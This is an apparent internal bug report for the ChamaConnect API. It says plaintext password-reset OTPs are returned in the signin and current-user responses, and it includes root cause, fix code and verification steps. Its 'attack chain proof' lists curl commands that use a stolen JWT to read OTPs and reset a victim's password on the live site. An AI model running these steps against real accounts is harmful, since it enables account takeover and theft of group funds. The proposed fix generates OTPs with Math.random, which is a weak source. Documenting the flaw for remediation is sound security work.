<p align="center">
  <img src="https://chamaconnect.io/images/chamaconnect.svg" alt="ChamaConnect" />
</p>

# BUG-058 — OTP Tokens Stored in Plaintext and Returned in API Responses

| Field | Value |
|---|---|
| Severity | Critical |
| Surface | API → `GET /api/proxy/users/current-user`, `POST /api/proxy/users/signin` |
| Status | Open |
| Discovered | 2026-04-20 |
| Discovered by | Manual API probe |

## Evidence

Both the signin response and the authenticated `current-user` endpoint return all pending OTP tokens in **plaintext** inside the `otpMessages` array:

```
GET https://chamaconnect.io/api/proxy/users/current-user
Authorization: Bearer <any valid JWT>

HTTP/2 200
{
  "data": {
    "otpMessages": [
      { "id": "...", "token": "566372", "messageType": "OtpPasswordReset",
        "isExpired": "2026-04-21T10:04:56.437Z", ... },
      { "id": "...", "token": "747987", "messageType": "OtpPasswordReset",
        "isExpired": "2026-04-21T10:07:19.126Z", ... },
      ... (32 more records, all plaintext 6-digit OTPs)
    ],
    "user": { ... }
  }
}
```

All 32+ OTP records for the account were returned with literal numeric values (e.g., `"566372"`, `"747987"`) — not hashes, not redacted.

**Attack chain proof:**
```bash
# Step 1: Attacker steals victim's JWT (via XSS, BUG-013 token in response, etc.)
STOLEN_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# Step 2: Read all pending OTPs from current-user — no email access required
curl -H "Authorization: Bearer $STOLEN_JWT" \
  https://chamaconnect.io/api/proxy/users/current-user \
  | jq '.data.otpMessages[].token'
# Output: "566372" "747987" "441497" ... (all valid, unexpired)

# Step 3: Use any OTP to reset victim's password
curl -X POST -H 'content-type: application/json' \
  --data '{"email":"victim@example.com","otp":"566372","newPassword":"AttackerPass1!","confirmPassword":"AttackerPass1!"}' \
  https://chamaconnect.io/api/proxy/users/password-reset
# Full account takeover
```

## User impact

A Kenyan chama treasurer who leaves their phone unattended, or whose session token is stolen via a network interception or XSS attack, can have their account fully taken over by an attacker — even without the attacker ever receiving the password-reset email. The attacker simply reads the OTP tokens directly from the API, uses one to set a new password, and locks the legitimate user out of their account, gaining access to all group funds, member data, and M-Pesa credentials.

## Root cause

Two distinct issues combine to create this critical vulnerability:

1. **Plaintext OTP storage**: OTP tokens are stored as raw 6-digit numbers in the database. They should be one-way hashed (e.g., with `bcrypt` or `argon2`) before storage, similar to how passwords are handled. When the user submits an OTP during reset, the submitted value should be hashed and compared to the stored hash.

2. **Unnecessary OTP inclusion in API responses**: The `otpMessages` relation is eagerly loaded and included in the `currentUser` and `signin` API responses. Password-reset OTPs are server-side secrets; they should never be returned to the client, period.

## Proposed fix

```typescript
// 1. Hash OTPs before storage (otpService.ts)
import bcrypt from 'bcrypt';

export async function createOtp(userId: string, type: string) {
  const plainOtp = Math.floor(100000 + Math.random() * 900000).toString();
  const hashedOtp = await bcrypt.hash(plainOtp, 10);
  await OtpMessage.create({ userId, token: hashedOtp, messageType: type, ... });
  return plainOtp; // send ONLY this to the user's email/SMS — never store plaintext
}

export async function verifyOtp(userId: string, submitted: string, type: string) {
  const records = await OtpMessage.find({ userId, messageType: type, isExpired: { $gt: new Date() } });
  for (const record of records) {
    if (await bcrypt.compare(submitted, record.token)) {
      await record.deleteOne(); // invalidate after use
      return true;
    }
  }
  return false;
}

// 2. Remove otpMessages from API responses (userController.ts)
export const getCurrentUser = asyncHandler(async (req, res) => {
  const user = await User.findById(req.user.id)
    .populate('role')
    .populate('groupMembers')
    // Remove: .populate('otpMessages')  ← never expose this
    .select('-password');
  return res.json({ status: 'success', data: user });
});
```

## Verification

1. Request a password reset OTP for a test account.
2. Call `GET /api/proxy/users/current-user` with the account's JWT.
3. Confirm that no `otpMessages` array is present in the response.
4. Confirm that the OTP stored in the DB is a bcrypt hash (60-character string starting with `$2b$`), not a 6-digit number.
5. Confirm that the plaintext OTP submitted by the user still validates correctly against the stored hash.
